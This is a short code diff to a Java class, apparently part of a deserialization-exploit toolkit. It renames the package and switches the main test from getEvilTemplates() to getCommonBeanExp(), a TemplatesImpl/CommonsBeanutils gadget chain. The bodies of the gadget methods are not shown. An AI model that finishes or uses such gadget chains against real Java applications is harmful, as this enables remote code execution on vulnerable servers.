@@ -1,4 +1,4 @@
-package ExpUtils;
+package expUtils;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
@@ -9,7 +9,7 @@ import java.lang.reflect.Field;
 import java.math.BigInteger;
 import java.util.PriorityQueue;
 
-import static ExpUtils.ReflectUtils.getClassByte;
+import static expUtils.ReflectUtils.getClassByte;
 
 public class ExpUtils {
     public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
@@ -59,6 +59,6 @@ public class ExpUtils {
 
 
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException {
-        unserialize(serialize(getEvilTemplates()));
+        unserialize(serialize(getCommonBeanExp()));
     }
 }
